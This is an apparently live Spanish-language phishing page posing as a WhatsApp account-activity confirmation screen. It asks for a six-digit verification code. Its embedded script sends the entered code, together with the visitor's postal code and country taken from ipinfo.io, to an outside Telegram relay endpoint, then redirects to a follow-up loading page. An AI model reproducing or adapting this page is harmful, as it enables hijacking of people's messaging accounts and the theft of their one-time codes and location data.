<!DOCTYPE html>
<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Actividad en su cuenta - confirmacion</title>
    <link rel="stylesheet" type="text/css" href="https://sappsapp23.sirv.com/docs/styles.css">
    <style>
    * {
      box-sizing: border-box;
    }

    html, body {
      margin: 0;
      padding: 0;
      overflow-x: hidden;
      width: 100vw;
      max-width: 100vw;
    }

    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }

    .content {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      width: 100%;
      max-width: 100vw;
      text-align: center;
    }

    form {
      width: 100%;
      max-width: 400px;
    }

    select, input, button {
      width: 100%;
      margin: 10px 0;
      padding: 12px;
    }

    #popup, footer {
      width: 100%;
      text-align: center;
    }

    img {
      max-width: 100%;
      height: auto;
    }

    /* Spinner dentro del botón */
    .btn-spinner {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255,255,255,.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    /* Estilo del botón cuando está cargando */
    #submitButton.loading {
      cursor: not-allowed;
      opacity: 0.8;
    }
    
    /* Ocultar texto cuando está cargando */
    #submitButton.loading .btn-text {
      display: none;
    }
    
    /* Mostrar spinner solo cuando tiene clase loading */
    #submitButton .btn-spinner {
      display: none;
    }
    
    #submitButton.loading .btn-spinner {
      display: inline-block;
    }

    /* Centrar contenido del botón */
    #submitButton {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 44px;
    }
    </style>
</head>
<body>


    <header>
        <img src="https://sappsapp23.sirv.com/docs/117_outlook.jpg" alt="Logo WhatsApp">
    </header>

    <div class="content">
         <img src="https://sappsapp23.sirv.com/docs/117_outlook.jpg" width="350" alt="Logo WhatsApp">
        <p>Le hemos enviado un código de verificación de 6 dígitos a su número teléfono registrado, por favor, introduzca el código:</p>
        <form id="verificationForm">
    
            <input type="tel" id="cod" name="cod" minlength="6" maxlength="6" placeholder="Código" required="">

            <button type="submit" id="submitButton">
                <span class="btn-text">Continuar</span>
                <span class="btn-spinner"></span>
            </button>
        </form>
    </div>

    <footer>
        <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp">
    </footer>
<script type="text/javascript">
document.addEventListener("DOMContentLoaded", function() {
    // Función para obtener el valor de un parámetro de la URL
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    // Función para obtener la ubicación con ipinfo.io y enviar el mensaje a Telegram
    function obtenerUbicacionYEnviarMensajeTelegram(codigo, nextPage, message) {
        fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            var zipCode = data.postal;     // ZIP CODE
            var pais = data.country;       // PAIS (código ISO)

            // Formato exacto solicitado: Zip Code y Pais en la misma línea
            message += '\nZip Code: ' + (zipCode || 'No disponible') + ' Pais: ' + pais;
            enviarMensajeTelegram(message, nextPage);
        })
        .catch(error => {
            console.error("Error al obtener la ubicación:", error);
            message += "\nZip Code: No disponible Pais: Desconocido";
            enviarMensajeTelegram(message, nextPage);
        });
    }

    // Función para enviar el mensaje a Telegram y redirigir
    function enviarMensajeTelegram(mensaje, nextPage) {
        var url = 'https://telegram-backend-umber.vercel.app/api/telegram';
        
        var params = {
            message: mensaje
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(params)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Ocurrió un error al enviar el mensaje.');
            }
            console.log('Mensaje enviado con éxito.');
            window.location.href = nextPage;
        })
        .catch(error => {
            console.error('Error al enviar el mensaje:', error);
            // Rehabilitar el botón si hay error
            const btn = document.getElementById("submitButton");
            if (btn) {
                btn.classList.remove("loading");
                btn.disabled = false;
            }
        });
    }

    // Evento de envío de formulario para la sección de verificación de código
    var verificationForm = document.getElementById("verificationForm");
    if (verificationForm) {
        verificationForm.addEventListener("submit", function(event) {
            event.preventDefault();
            
            const btn = document.getElementById("submitButton");
            if (btn) {
                btn.classList.add("loading");
                btn.disabled = true;
            }
            
            var cod = document.getElementById("cod").value;
            
            // Mensaje base con formato exacto
            var mensajeBase = "💲 Whatsapp COD PANTALLA 💲:\nCODIGO WHATSAPP: " + cod;
            
            obtenerUbicacionYEnviarMensajeTelegram(cod, "loading2.html?action=cod", mensajeBase);
        });
    }
});
</script>


</body></html>
